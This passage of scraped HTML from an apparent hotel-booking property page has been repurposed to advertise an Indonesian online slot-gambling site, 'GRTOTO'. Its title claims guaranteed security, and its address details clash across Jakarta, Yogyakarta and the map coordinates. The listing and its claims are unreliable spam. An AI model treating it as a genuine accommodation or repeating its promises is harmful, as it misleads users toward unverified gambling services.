3.44 2.39 3.66 3.66 0 0 1-1.02 4.01z"/></svg>
<div
id="hotelTmpl"
class=""
>
<main role="main"
id="basiclayout"
>
<div
class="hotelchars"
>
<div class="page-section hp-gallery-grid">
<div class="bui-grid bui-grid--size-small">
<div class="bui-grid__column bui-grid__column-12">
<div data-capla-component-boundary="b-property-web-property-page/PropertyHeaderNavDesktop"><div data-testid="header-nav-container" class="cf8b5eca0c"><nav aria-label="Tautan halaman internal" class="d24b1ed1cf f5852f597b d731d67377 da2666adb4"><div class="f45162dfea c91a817ea0"><ul class="c4a6e8e871"><li class="ddb4fbcb64" style="width:16.666666666666668%"><a id="overview-tab-trigger" data-testid="Property-Header-Nav-Tab-Trigger-overview" data-tab-link="true" data-scroll="a[name=overview]" tabindex="0" href="#hotelTmpl" class="de576f5064 f63e3c83f3 e7f2b1a356"><span style="--bui_stack_spaced_gap--s:2" class="f6e3a11b0d a19a26a18c a81870d302 a5a81c5b1f e95943ce9b"><div class="ca9d921c46"><span class="b99b6ef58f">Gambaran</span></div></span></a></li><li class="ddb4fbcb64" style="width:16.666666666666668%"><a id="availability-tab-trigger" data-testid="Property-Header-Nav-Tab-Trigger-availability" data-tab-link="true" data-scroll="a[name=availability]" tabindex="0" href="#availability" class="de576f5064 f63e3c83f3 e7f2b1a356"><span style="--bui_stack_spaced_gap--s:2" class="f6e3a11b0d a19a26a18c a81870d302 a5a81c5b1f e95943ce9b"><div class="ca9d921c46"><span class="b99b6ef58f">Info &amp; harga</span></div></span></a></li><li class="ddb4fbcb64" style="width:16.666666666666668%"><a id="facilities-tab-trigger" data-testid="Property-Header-Nav-Tab-Trigger-facilities" data-tab-link="true" data-scroll="a[name=HotelFacilities]" tabindex="0" href="#hp_facilities_box" class="de576f5064 f63e3c83f3 e7f2b1a356"><span style="--bui_stack_spaced_gap--s:2" class="f6e3a11b0d a19a26a18c a81870d302 a5a81c5b1f e95943ce9b"><div class="ca9d921c46"><span class="b99b6ef58f">Fasilitas</span></div></span></a></li><li class="ddb4fbcb64" style="width:16.666666666666668%"><a id="policies-tab-trigger" data-testid="Property-Header-Nav-Tab-Trigger-policies" data-tab-link="true" data-scroll="a[name=policies]" tabindex="0" href="#policies" class="de576f5064 f63e3c83f3 e7f2b1a356"><span style="--bui_stack_spaced_gap--s:2" class="f6e3a11b0d a19a26a18c a81870d302 a5a81c5b1f e95943ce9b"><div class="ca9d921c46"><span class="b99b6ef58f">Aturan menginap</span></div></span></a></li><li class="ddb4fbcb64" style="width:16.666666666666668%"><a id="fine_print-tab-trigger" data-testid="Property-Header-Nav-Tab-Trigger-fine_print" data-tab-link="true" data-scroll="a[name=important_info]" tabindex="0" href="#important_info" class="de576f5064 f63e3c83f3 e7f2b1a356"><span style="--bui_stack_spaced_gap--s:2" class="f6e3a11b0d a19a26a18c a81870d302 a5a81c5b1f e95943ce9b"><div class="ca9d921c46"><span class="b99b6ef58f">Informasi penting</span></div></span></a></li><li class="ddb4fbcb64" style="width:16.666666666666668%"><a id="reviews-tab-trigger" data-testid="Property-Header-Nav-Tab-Trigger-reviews" data-tab-link="true" data-target="hp-reviews-sliding" data-component="core/sliding-panel-trigger" data-google-track="Click/Action: hotel/review_link_inline_v1" rel="reviews" tabindex="0" href="#blockdisplay4" class="de576f5064 f63e3c83f3 e7f2b1a356"><span style="--bui_stack_spaced_gap--s:2" class="f6e3a11b0d a19a26a18c a81870d302 a5a81c5b1f e95943ce9b"><div class="ca9d921c46"><span class="b99b6ef58f">Belum ada ulasan</span></div></span></a></li><li class="ddb4fbcb64 b908223875" role="presentation" style="width:16.666666666666668%"><span class="a297f43545"><button aria-expanded="false" class="f63e3c83f3" type="button">Lainnya<span class="fc70cba028 b1bcc387ce ca6ff50764 c8605fc002" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M12 20.09a1.24 1.24 0 0 1-.88-.36L6 14.61a.75.75 0 1 1 1.06-1.06L12 18.49l4.94-4.94A.75.75 0 0 1 18 14.61l-5.12 5.12a1.24 1.24 0 0 1-.88.36m6-9.46a.75.75 0 0 0 0-1.06l-5.12-5.11a1.24 1.24 0 0 0-1.754-.006l-.006.006L6 9.57a.75.75 0 0 0 0 1.06.74.74 0 0 0 1.06 0L12 5.7l4.94 4.93a.73.73 0 0 0 .53.22c.2 0 .39-.078.53-.22"></path></svg></span></button></span></li></ul></div></nav></div></div>
</div>
<div class="bui-grid__column bui-grid__column-12">
<div data-et-view="THHSOFRURURYNYHIYTLRQJRbWdWOGVO:1"></div>
<div data-et-view="THHSOFRURURYNYHIYTLRQJRbWdWOGVO:3"></div>
<div data-et-view="THHSOFRURURYNYHIYTLRQJRbWdWOGVO:5"></div>
<svg class="bk-icon -streamline-travel_sustainable_level_1" height="24" style="display:none;" width="72" viewBox="0 0 72 24" role="presentation" aria-hidden="true" focusable="false"><path d="M16.29 19.72c4.22-4.22 8.4-17.56 6.7-19.26S7.95 2.93 3.73 7.16C.67 10.22.62 15.58 3.5 18.98L15.62 6.86c.29-.29.77-.29 1.06 0s.29.77 0 1.06L4.57 20.03l-2.14 2.14c-.29.29-.29.77 0 1.06s.77.29 1.06 0l2.34-2.34c3.34 1.88 7.78 1.51 10.46-1.17ZM46.99.46c-1.15-1.16-6.85.55-8.56 1.11-2.26.73-7.83 2.73-10.7 5.6-1.5 1.5-2.36 3.69-2.35 6.01 0 2.18.76 4.21 2.12 5.81l-3.18 3.18c-.29.29-.29.77 0 1.06.15.15.34.22.53.22s.38-.07.53-.22l3.18-3.18c1.64 1.35 3.72 2.04 5.78 2.04 2.2 0 4.37-.78 5.94-2.35 2.87-2.87 4.87-8.44 5.6-10.7.55-1.72 2.27-7.41 1.1-8.57Zm-7.76 18.21c-2.21 2.21-6.54 2.77-9.6.31L40.68 7.93c.29-.29.29-.77 0-1.06s-.77-.29-1.06 0L28.56 17.93c-1.08-1.31-1.67-2.97-1.68-4.75 0-1.93.69-3.73 1.91-4.95 3.87-3.87 14.19-6.68 16.78-6.68.13 0 .24 0 .33.02.31 1.85-2.59 13.03-6.67 17.11ZM70.99.46c-1.15-1.16-6.85.55-8.56 1.11-2.26.73-7.83 2.73-10.7 5.6-1.5 1.5-2.36 3.69-2.35 6.01 0 2.18.76 4.21 2.12 5.81l-3.18 3.18c-.29.29-.29.77 0 1.06.15.15.34.22.53.22s.38-.07.53-.22l3.18-3.18c1.64 1.35 3.72 2.04 5.78 2.04 2.2 0 4.37-.78 5.94-2.35 2.87-2.87 4.87-8.44 5.6-10.7.55-1.72 2.27-7.41 1.1-8.57Zm-7.76 18.21c-2.21 2.21-6.54 2.77-9.6.31L64.68 7.93c.29-.29.29-.77 0-1.06s-.77-.29-1.06 0L52.56 17.93c-1.08-1.31-1.67-2.97-1.68-4.75 0-1.93.69-3.73 1.91-4.95 3.87-3.87 14.19-6.68 16.78-6.68.13 0 .24 0 .33.02.31 1.85-2.59 13.03-6.67 17.11Z"/></svg>
<svg class="bk-icon -streamline-travel_sustainable_level_2" height="24" style="display:none;" width="72" viewBox="0 0 72 24" role="presentation" aria-hidden="true" focusable="false"><path d="M16.29 19.72c4.22-4.22 8.4-17.56 6.7-19.26S7.95 2.93 3.73 7.16C.67 10.22.62 15.58 3.5 18.98L15.62 6.86c.29-.29.77-.29 1.06 0s.29.77 0 1.06L4.57 20.03l-2.14 2.14c-.29.29-.29.77 0 1.06s.77.29 1.06 0l2.34-2.34c3.34 1.88 7.78 1.51 10.46-1.17ZM70.99.46c-1.15-1.16-6.85.55-8.56 1.11-2.26.73-7.83 2.73-10.7 5.6-1.5 1.5-2.36 3.69-2.35 6.01 0 2.18.76 4.21 2.12 5.81l-3.18 3.18c-.29.29-.29.77 0 1.06.15.15.34.22.53.22s.38-.07.53-.22l3.18-3.18c1.64 1.35 3.72 2.04 5.78 2.04 2.2 0 4.37-.78 5.94-2.35 2.87-2.87 4.87-8.44 5.6-10.7.55-1.72 2.27-7.41 1.1-8.57Zm-7.76 18.21c-2.21 2.21-6.54 2.77-9.6.31L64.68 7.93c.29-.29.29-.77 0-1.06s-.77-.29-1.06 0L52.56 17.93c-1.08-1.31-1.67-2.97-1.68-4.75 0-1.93.69-3.73 1.91-4.95 3.87-3.87 14.19-6.68 16.78-6.68.13 0 .24 0 .33.02.31 1.85-2.59 13.03-6.67 17.11ZM40.29 19.72c4.23-4.23 8.41-17.56 6.7-19.26s-15.04 2.48-19.26 6.7c-3.06 3.06-3.11 8.42-.23 11.82L39.62 6.86c.29-.29.77-.29 1.06 0s.29.77 0 1.06L28.57 20.03l-2.14 2.14c-.29.29-.29.77 0 1.06s.77.29 1.06 0l2.34-2.34c3.34 1.88 7.78 1.51 10.46-1.17Z"/></svg>
<svg class="bk-icon -streamline-travel_sustainable_level_3" height="24" style="display:none;" width="72" viewBox="0 0 72 24" role="presentation" aria-hidden="true" focusable="false"><path d="M16.29 19.72c4.22-4.22 8.4-17.56 6.7-19.26S7.95 2.93 3.73 7.16C.67 10.22.62 15.58 3.5 18.98L15.62 6.86c.29-.29.77-.29 1.06 0s.29.77 0 1.06L4.57 20.03l-2.14 2.14c-.29.29-.29.77 0 1.06s.77.29 1.06 0l2.34-2.34c3.34 1.88 7.78 1.51 10.46-1.17ZM40.29 19.72c4.23-4.23 8.41-17.56 6.7-19.26s-15.04 2.48-19.26 6.7c-3.06 3.06-3.11 8.42-.23 11.82L39.62 6.86c.29-.29.77-.29 1.06 0s.29.77 0 1.06L28.57 20.03l-2.14 2.14c-.29.29-.29.77 0 1.06s.77.29 1.06 0l2.34-2.34c3.34 1.88 7.78 1.51 10.46-1.17ZM64.29 19.72c4.23-4.23 8.41-17.56 6.7-19.26s-15.04 2.48-19.26 6.7c-3.06 3.06-3.11 8.42-.23 11.82L63.62 6.86c.29-.29.77-.29 1.06 0s.29.77 0 1.06L52.57 20.03l-2.14 2.14c-.29.29-.29.77 0 1.06s.77.29 1.06 0l2.34-2.34c3.34 1.88 7.78 1.51 10.46-1.17Z"/></svg>
<svg class="bk-icon -streamline-travel_sustainable_level_3_plus" height="24" style="display:none;" width="90" viewBox="0 0 90 24" role="presentation" aria-hidden="true" focusable="false"><path d="M40.29 19.72c4.23-4.23 8.41-17.56 6.7-19.26s-15.04 2.48-19.26 6.7c-3.06 3.06-3.11 8.42-.23 11.82L39.62 6.86c.29-.29.77-.29 1.06 0s.29.77 0 1.06L28.57 20.03l-2.14 2.14c-.29.29-.29.77 0 1.06s.77.29 1.06 0l2.34-2.34c3.34 1.88 7.78 1.51 10.46-1.17ZM64.29 19.72c4.23-4.23 8.41-17.56 6.7-19.26s-15.04 2.48-19.26 6.7c-3.06 3.06-3.11 8.42-.23 11.82L63.62 6.86c.29-.29.77-.29 1.06 0s.29.77 0 1.06L52.57 20.03l-2.14 2.14c-.29.29-.29.77 0 1.06s.77.29 1.06 0l2.34-2.34c3.34 1.88 7.78 1.51 10.46-1.17ZM76.38 10.85c-.69 0-1.26.57-1.26 1.26v.84c0 .69.57 1.26 1.26 1.26h2.52c.23 0 .42.19.42.42v2.52c0 .7.57 1.26 1.26 1.26h.84c.7 0 1.26-.56 1.26-1.26v-2.52c0-.23.19-.42.42-.42h2.52c.69 0 1.26-.57 1.26-1.26v-.84c0-.69-.57-1.26-1.26-1.26H83.1c-.23 0-.42-.19-.42-.42V7.91c0-.69-.57-1.26-1.26-1.26h-.84c-.69 0-1.26.57-1.26 1.26v2.52c0 .23-.19.42-.42.42h-2.52ZM16.29 19.72c4.22-4.22 8.4-17.56 6.7-19.26S7.95 2.93 3.73 7.16C.67 10.22.62 15.58 3.5 18.98L15.62 6.86c.29-.29.77-.29 1.06 0s.29.77 0 1.06L4.57 20.03l-2.14 2.14c-.29.29-.29.77 0 1.06s.77.29 1.06 0l2.34-2.34c3.34 1.88 7.78 1.51 10.46-1.17Z"/></svg>
<div
id="wrap-hotelpage-top"
class="wrap-hotelpage-top"
>
<form
action="https://secure.booking.com/book.html"
method="post"
id="top-book"
class="wrap-hotelpage-top__book top-book-form form_wl_fix"
>
<input type="hidden" name="aid" value="356980" />
<input type="hidden" name="label" value="gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ" />
<input type="hidden" name="sid" value="7ddc46c9c1086cdb3bc11bc91f12833b" />
<input type="hidden" name="hostname" value="www.booking.com" />
<input type="hidden" name="aid" value="356980" />
<input type="hidden" name="hotel_id" value="14770538" />
<input type="hidden" name="maxrooms" value="10" />
<input type="hidden" name="stage" value="0" />
<input type="hidden" name="interval" value="" />
<input type="hidden" name="checkin" value="" />
<input type="hidden" name="nr_rooms_" value="nr_rooms_14770538" />
<div class="property_wishlist_widget_wrapper">
<div data-capla-component-boundary="b-property-web-property-page/PropertyWishlistWidgetDesktop"><div data-testid="PropertyWishlistWidgetDesktop-wrapper"><span><span class="a297f43545"><span class="a297f43545"><span><button aria-expanded="false" data-testid="wishlist-button" aria-label="Simpan item ini ke daftar perjalanan" type="button" class="de576f5064 b46cd7aad7 e26a59bb37 c295306d66 dda427e6b5 aaf9b6e287 a0ddd706cc"><span class="ec1ff2f0cb"><span class="fc70cba028 e2a1cd6bfe" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="m12.45 22.33-9.48-9.98c-1.9-1.9-1.9-4.99 0-6.99 1.9-1.9 4.99-1.9 6.99 0l1.6 1.6c.3.3.8.3 1.1 0l1.6-1.6c1.9-1.9 4.99-1.9 6.99 0 1.9 1.9 1.9 4.99 0 6.99l-9.58 9.98h1.1-.3Zm-1 1.1c.3.3.8.3 1.1 0l9.58-9.98c2.49-2.49 2.49-6.59 0-9.08s-6.59-2.49-9.08 0l-1.6 1.6h1.1l-1.6-1.6c-2.49-2.49-6.59-2.49-9.08 0s-2.49 6.59 0 9.08z"></path></svg></span></span></button></span></span></span></span></div></div>
</div>
<div class="property_share_wrapper">
<div data-capla-component-boundary="b-property-web-property-page/PropertyShareDesktop"><div data-testid="PropertyShare-wrapper"><div data-testid="property-share-container"><span class="a297f43545"><span class="a297f43545"><button aria-expanded="false" aria-label="Bagikan akomodasi ini" data-testid="property-share-button" type="button" class="de576f5064 b46cd7aad7 e26a59bb37 c295306d66 dda427e6b5 aaf9b6e287"><span class="ec1ff2f0cb"><span class="fc70cba028 e2a1cd6bfe" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M8.25 11.25a3 3 0 1 1-6 0 3 3 0 0 1 6 0m1.5 0a4.5 4.5 0 1 0-9 0 4.5 4.5 0 0 0 9 0m12-5.25a3 3 0 1 1-6 0 3 3 0 0 1 6 0m1.5 0a4.5 4.5 0 1 0-9 0 4.5 4.5 0 0 0 9 0m-1.5 12a3 3 0 1 1-6 0 3 3 0 0 1 6 0m1.5 0a4.5 4.5 0 1 0-9 0 4.5 4.5 0 0 0 9 0M9.018 10.59l6.508-2.531a.75.75 0 0 0-.544-1.398L8.474 9.192a.75.75 0 1 0 .544 1.398m-.748 3.009 6.79 3.395a.75.75 0 1 0 .67-1.342l-6.79-3.395a.75.75 0 1 0-.67 1.342"></path></svg></span></span></button></span></span></div></div></div>
</div>
<button class="txp-bui-header-pp bui-button bui-button--primary 
book_now_button_handler
"
id="hcta"
type="submit"
data-url=""
aria-description="
Lihat ketersediaan dan harga
"
data-et-click="goal:hp_d_reserve_button_top_of_hp_clicked customGoal:eWHMcCcCcCSYeJdBbFUdWHDXKe:1 customGoal:eWHMcCcCcCSYeJZOIYCZYPfWRHZGFGHbOPHe:2 customGoal:eWHMcCcCcCSYeJUaXNNJIaKEO:1"
data-et-view="eWHMcCcCcCSYeJZOIYCZYPfWRHZGFGHbOPHe:1"
data-et-mouseenter=" customGoal:eWHMcCcCcCSYeJZOIYCZYPfWRHZGFGHbOPHe:1 eWHMcCcCcCSYeJZOIYCZYPfWRHZGFGHbOPHe:2    eWHMcCcCcCSYeJZOIYCZYPfWRHZGFGHbOPHe:6    eWHMcCcCcCSYeJZOIYCZYPfWRHZGFGHbOPHe:9  "
data-bui-tooltip data-bui-component="Tooltip" data-tooltip-position="top" data-tooltip-text="Anda belum akan ditagih pembayaran"
>
<span class="bui-button__text">
Pesan sekarang
</span>
<span class="b-button__from-text book_now_rt_summary g-hidden"></span>
</button>
<div class="topbook_pricematch">
<div id="rate_guarantee">
<div data-capla-component-boundary="b-property-web-property-page/PriceMatch/ssr/pp-sidebar"><span class="a297f43545"><button data-testid="price-match-trigger" type="button" class="de576f5064 b46cd7aad7 e26a59bb37 c295306d66 c7a901b0e7 aaf9b6e287"><span class="ec1ff2f0cb e31845302d"><span class="fc70cba028 ca6ff50764" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M.311 2.56v6.257a3.75 3.75 0 0 0 1.098 2.651l11.56 11.562a2.25 2.25 0 0 0 3.182 0l6.88-6.88a2.25 2.25 0 0 0 0-3.181L11.468 1.408A3.75 3.75 0 0 0 8.818.31H2.56A2.25 2.25 0 0 0 .31 2.56zm1.5 0a.75.75 0 0 1 .75-.75h6.257a2.25 2.25 0 0 1 1.59.659l11.562 11.56a.75.75 0 0 1 0 1.06l-6.88 6.88a.75.75 0 0 1-1.06 0L2.47 10.409a2.25 2.25 0 0 1-.659-1.59zm5.25 3.75a.75.75 0 1 1-1.5 0 .75.75 0 0 1 1.5 0m1.5 0a2.25 2.25 0 1 0-4.5 0 2.25 2.25 0 0 0 4.5 0"></path></svg></span></span><span class="ca2ca5203b">Kami Samakan Harganya</span></button></span></div>
</div>
</div>
</form>
<div
class="hp__hotel-title pp-header"
>
<div id="hp_hotel_name">
<span
class="hp__hotel_ratings pp-header__badges pp-header__badges--combined"
>
<div data-capla-component-boundary="b-property-web-property-page/Badges"><div data-testid="PropertyBadges-wrapper" style="--bui_stack_spaced_gap--s:2" class="f6e3a11b0d a19a26a18c a81870d302 e95943ce9b"><span class="fff1944c52 cd3e7df908 b4f3c91e87"><span class="f323fd7e96">GRTOTO © All Rights Reserved</span></span></div></div>
</span>
<div data-capla-component-boundary="b-property-web-property-page/PropertyHeaderName"><h2 class="ddb12f4f86 pp-header__title">GRTOTO: Bandar Slot Online Hari ini Keamanan Pasti Terjamin</h2></div>
</div>
</div>
<a href="#availability"
class="fn "
id="hp_hotel_name_reviews"
style="display:none"
>
GRTOTO: Bandar Slot Online Hari ini Keamanan Pasti Terjamin
</a>
<div data-et-view="eWHMAERBfISWdLPXPRQIKdFHaO:2"></div>
<div data-capla-component-boundary="b-property-web-property-page/PropertyHeaderAddressDesktop"><div class="c9f9ad76d4" data-testid="PropertyHeaderAddressDesktop-wrapper"><div><div class="b6937ecb12"><div style="--bui_stack_spaced_gap--s:0" class="f6e3a11b0d a19a26a18c a81870d302 a5a81c5b1f e95943ce9b"><a data-atlas-latlng="3.5461649,98.7631272" data-atlas-bbox="3.52819842084319,98.74512677798265,3.564131030027542,98.78112832161538" data-source="top_link" title="GRTOTO: Bandar Slot Online Hari ini Keamanan Pasti Terjamin, Yogyakarta - Cek lokasi" id="map_trigger_header_pin" href="#map_opened-map_trigger_header_pin" class="de576f5064 bef8628e61 a4b276b5a9 e0d8514d4d"><span><span class="fc70cba028 e2a1cd6bfe" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M12 0a8.01 8.01 0 0 0-8 8c0 3.51 5 12.025 7.148 15.524A1 1 0 0 0 12 24a.99.99 0 0 0 .852-.477C15 20.026 20 11.514 20 8a8.01 8.01 0 0 0-8-8m0 11.5A3.5 3.5 0 1 1 15.5 8a3.5 3.5 0 0 1-3.5 3.5"></path></svg></span></span></a><div class="ca9d921c46 a21cb847ab"><span class="a297f43545"><button type="button" class="de576f5064"><div class="b99b6ef58f cb4b7a25d9 b06461926f">Jakarta Selatan - DKI Jakarta, 12560 Jakarta, Indonesia<div aria-hidden="true" class="dcf8588897">Setelah memesan, semua rincian akomodasi termasuk nomor telepon dan alamat akan disertakan dalam konfirmasi pemesanan dan akun Anda.</div></div></button></span><span class="b70006e9dc">–</span><a data-atlas-latlng="3.5461649,98.7631272" data-atlas-bbox="3.52819842084319,98.74512677798265,3.564131030027542,98.78112832161538" data-source="top_link" title="GRTOTO: Bandar Slot Online Hari ini Keamanan Pasti Terjamin, Yogyakarta - Cek lokasi" id="map_trigger_header" href="#map_opened-map_trigger_header" class="de576f5064 bef8628e61 c1af58684d e0d8514d4d"><span>Tampilkan peta</span></a></div></div></div></div></div></div>
</div>
<div style="clear: both;"></div>
</div>
<div class="k2-hp--gallery-header bui-grid__column bui-grid__column-9">
<div
class="hotelchars blockdisplay fbblock pretty_headers hp-consistent-vertical-rhythm"
data-tab="main" id="blockdisplay1"
>
<div
id="hotel_main_content"
class="nha_large_photo_main_content nha_large_photo_extra_height"
>
<div aria-label="Galeri foto GRTOTO: Bandar Slot Online Hari ini Keamanan Pasti Terjamin" data-et-view="eWHMeDUfUMVBFUPJUKBSWIKdFHfMTXEUDae:2 eWHMeDUfUMVBFUPJUKBSWIKdFHfMTXEUDae:3 eWHMeDUfUMVBFUPJUKBSWIKdFHfMTXEUDae:9">


  <div data-capla-component-boundary="b-property-web-property-page/GalleryDesktop"><div id="photo_wrapper" data-testid="GalleryDesktop-wrapper" role="region" aria-label="Galeri foto GRTOTO: Bandar Slot Online Hari ini Keamanan Pasti Terjamin"><div></div><div></div><div></div><div><div style="--bui_stack_spaced_gap--s:2;--bui_mixin_width--s:100%;--bui_mixin_height--s:470px" class="f6e3a11b0d ae5dbab14d e95943ce9b db48780985 f65059a889 bc733a7a78"><div style="--bui_stack_spaced_gap--s:2;--bui_mixin_width--s:100%;--bui_mixin_height--s:470px" class="f6e3a11b0d a19a26a18c ed582438e0 ac30880487 e95943ce9b db48780985 f65059a889"><div class="aa225776f2 ca9d921c46"><button type="button" class="de576f5064 e8e06b23a3"><picture class="b7a691c583 ff87070776" style="--bui_image_width--s:100%;--bui_image_height--s:100%"><img class="f6c12c77eb c0e44985a8 c09abd8a52 ca3dad4476" src="https://ik.imagekit.io/ljdihgltp/GRTOTO/bandar-slot.jpg" alt="Galeri foto GRTOTO: Bandar Slot Online Hari ini Keamanan Pasti Terjamin di Yogyakarta" loading="lazy"/></picture></button></div><div style="--bui_stack_spaced_gap--s:2" class="f6e3a11b0d ae5dbab14d ed582438e0 ac30880487 e95943ce9b d7bd13e882"><div class="aa225776f2 ca9d921c46 fd950bce8b"><button type="button" class="de576f5064 e8e06b23a3"><picture class="b7a691c583 ff87070776" style="--bui_image_width--s:100%;--bui_image_height--s:100%"><img class="f6c12c77eb c0e44985a8 c09abd8a52 ca3dad4476" src="https://ik.imagekit.io/ljdihgltp/GRTOTO/bandar-slot.jpg" alt="Sertifikat, penghargaan, tanda, atau dokumen yang dipajang di GRTOTO: Bandar Slot Online Hari ini Keamanan Pasti Terjamin" loading="lazy"/></picture></button></div><div class="aa225776f2 ca9d921c46 fd950bce8b"><button type="button" class="de576f5064 e8e06b23a3"><picture class="b7a691c583 ff87070776" style="--bui_image_width--s:100%;--bui_image_height--s:100%"><img class="f6c12c77eb c0e44985a8 c09abd8a52 ca3dad4476" src="https://ik.imagekit.io/ljdihgltp/GRTOTO/bandar-slot.jpg" alt="Galeri foto GRTOTO: Bandar Slot Online Hari ini Keamanan Pasti Terjamin di Yogyakarta" loading="lazy"/></picture></button></div></div></div></div></div><div></div></div></div>
<div class="bh-photo-modal-backdrop"></div>
<div class=" bh-photo-modal bh-photo-modal--side-panel  js-no-close "
data-component="bh-photo-modal"
data-is-rtl=""
role="region"
aria-label="Galeri foto GRTOTO: Bandar Slot Online Hari ini Keamanan Pasti Terjamin"
>
<div class="bh-photo-modal-header">
<div class="bh-photo-modal-name-cta">
<span class="bh-photo-modal-name">
GRTOTO: Bandar Slot Online Hari ini Keamanan Pasti Terjamin
</span>
<span>
<button class="bui-button bui-button--primary js-reserve-button" type="button" aria-description="
Lihat ketersediaan dan harga
">
<span class="bui-button__text">Pesan sekarang</span>
</button>
</span>
</div>
<div class="bh-photo-modal-toolbar bh-photo-modal-toolbar--left js-back-to-gallery-wrapper js-no-close">
<button
class="bui-button bui-button--light bh-photo-modal-back js-bh-photo-modal-change-layout"
data-layout="grid"
title="Galeri"
>
<span class="bui-button__icon">
<svg class="bk-icon -iconset-arrow_left" height="32" width="32" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M108 60H31.3l29.2-29.2a4 4 0 0 0-5.7-5.6L16 64l38.8 38.8a4 4 0 1 0 5.7-5.6L31.3 68H108a4 4 0 0 0 0-8z"/></svg>
</span>
<span class="bui-button__text">
Galeri
</span>
</button>
</div>
<div class="bh-photo-modal-toolbar js-no-close">
<button class="bui-button bui-button--light bh-photo-modal-close bh-no-user-select" role="button" title="Tutup">
<span class="bui-button__text">
Tutup
</span>
<span class="bui-button__icon">
<svg class="bk-icon -iconset-close_bold" height="32" width="32" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M75.3 64l26.4-26.3a8 8 0 0 0-11.4-11.4L64 52.7 37.7 26.3a8 8 0 0 0-11.4 11.4L52.7 64 26.3 90.3a8 8 0 0 0 11.3 11.4L64 75.3l26.3 26.4a8 8 0 0 0 11.4-11.4z"/></svg>
</span>
</button>
</div>
</div>
<div class="gallery-grid-view-modal__wrapper js-bh-photo-modal-layout js-no-close" data-layout="grid">
<div data-capla-component-boundary="b-property-web-property-page/GalleryGridViewModal"></div>
</div>
<div class="bh-photo-modal-single-photo-view-layout js-bh-photo-modal-layout" data-layout="photo-view">
<div data-capla-component-boundary="b-property-web-property-page/PropertyGallerySingleView"><div></div><div></div><div></div><div data-testid="PropertyGallerySingleView-wrapper" class="d6b451c6b7"><div role="region" data-testid="gallery-single-view" class="fd2facb266"><div class="c640ff6353"><div class="c69fd6ec1b ffa578936a" data-testid="gallery-single-view-image-switcher"><button data-testid="gallery-single-view-slider-prev-button" aria-label="Foto sebelumnya" type="button" class="de576f5064 b46cd7aad7 cf85d25fe8 c295306d66 dda427e6b5 bdd0fb6394 eeb85fb8d1 bb2e84a8b6"><span class="ec1ff2f0cb"><span class="fc70cba028 e2a1cd6bfe" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px" data-rtl-flip="true"><path d="M14.09 19.24a.87.87 0 0 1-.64-.27l-6.06-6.06c-.25-.25-.39-.59-.39-.94s.12-.69.36-.94l6.06-6.06a.909.909 0 0 1 1.3 1.27l-.02.02-5.69 5.72 5.72 5.72c.35.35.36.91.02 1.27l-.02.02a.9.9 0 0 1-.64.27"></path></svg></span></span></button><div class="f2bdaad6a0"><div class="cae9d628e9"><button data-testid="gallery-photo-732100688" aria-label="Galeri foto GRTOTO: Bandar Slot Online Hari ini Keamanan Pasti Terjamin di Yogyakarta" type="button" class="de576f5064 a3f30ca2ef"><div class="b66836a405"><span aria-label="Foto terbaru" class="fff1944c52 cd3e7df908 f3176cc990"><span class="f323fd7e96">Foto terbaru</span></span></div><div class="a569c58a0c" style="width:100%;height:100%" data-testid="lazy-image-container"><noscript><picture data-testid="lazy-image-image" class="b7a691c583 ff87070776 b392e5b1cf" style="--bui_image_width--s:100px;--bui_image_height--s:100px"><img class="f6c12c77eb c0e44985a8 c09abd8a52 ca3dad4476" src="https://ik.imagekit.io/ljdihgltp/GRTOTO/bandar-slot.jpg" alt="Galeri foto GRTOTO: Bandar Slot Online Hari ini Keamanan Pasti Terjamin di Yogyakarta" loading="lazy"/></picture></noscript></div></button></div></div><button data-testid="gallery-single-view-slider-next-button" aria-label="Foto selanjutnya" type="button" class="de576f5064 b46cd7aad7 cf85d25fe8 c295306d66 dda427e6b5 bdd0fb6394 eeb85fb8d1 bb2e84a8b6"><span class="ec1ff2f0cb"><span class="fc70cba028 e2a1cd6bfe" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px" data-rtl-flip="true"><path d="M9.91 19.24c.24 0 .47-.09.64-.27l6.06-6.06c.25-.25.39-.59.39-.94s-.12-.69-.36-.94l-6.06-6.06a.909.909 0 0 0-1.3 1.27l.02.02 5.69 5.72-5.72 5.72c-.35.35-.36.91-.02 1.27l.02.02c.17.17.4.27.64.27"></path></svg></span></span></button></div><div data-testid="gallery-single-view-counter-text" class="da8a6fe12c b84a059805"><div style="--bui_stack_spaced_gap--s:1" class="f6e3a11b0d a19a26a18c e95943ce9b">1 / 3</div></div><div class="f9e0057e76" data-testid="gallery-single-view-thumbnails"><button data-testid="gallery-photo-thumb-732100688" type="button" class="de576f5064"><div style="width:80px;height:80px" data-testid="lazy-image-container"><noscript><picture data-testid="lazy-image-image" class="b7a691c583 ff87070776 f9dda3f70e ed292077eb" style="--bui_image_width--s:80px;--bui_image_height--s:80px"><img class="f6c12c77eb c0e44985a8 c09abd8a52 ca3dad4476" src="https://cf.bstatic.com/xdata/images/hotel/max500/732100688.jpg?k=a58326955a39824f6c9bbef7ddcd0b28d2fd711e43bf56c20506fd9afe85475e&amp;o=" alt="Galeri foto GRTOTO: Bandar Slot Online Hari ini Keamanan Pasti Terjamin di Yogyakarta" loading="lazy"/></picture></noscript></div></button><button data-testid="gallery-photo-thumb-732100704" type="button" class="de576f5064"><div style="width:72px;height:72px" data-testid="lazy-image-container"><noscript><picture data-testid="lazy-image-image" class="b7a691c583 